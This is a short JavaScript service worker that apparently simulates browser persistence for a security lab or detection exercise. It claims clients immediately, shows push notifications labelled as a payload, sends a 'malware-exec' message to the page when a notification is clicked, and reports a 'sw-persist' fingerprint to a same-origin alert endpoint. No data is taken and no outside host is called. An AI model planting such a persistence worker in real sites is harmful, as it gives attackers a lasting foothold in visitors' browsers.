const CACHE = 'athena-persist-v1';

self.addEventListener('install', (e) => {
  self.skipWaiting();
});

self.addEventListener('activate', (e) => {
  e.waitUntil(self.clients.claim());
});

self.addEventListener('push', (event) => {
  const data = event.data ? event.data.json() : { title: 'SAM', body: 'exec' };
  event.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/payload.svg',
      tag: 'sam-payload',
      data: data
    })
  );
});

self.addEventListener('notificationclick', (event) => {
  event.notification.close();
  event.waitUntil(
    clients.openWindow('/').then((win) => {
      if (win) win.postMessage({ type: 'malware-exec' });
    })
  );
});

self.addEventListener('message', (event) => {
  if (event.data === 'ping') {
    fetch('/api/alert', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ fingerprint: 'sw-persist', type: 'service-worker' })
    }).catch(() => {});
  }
});
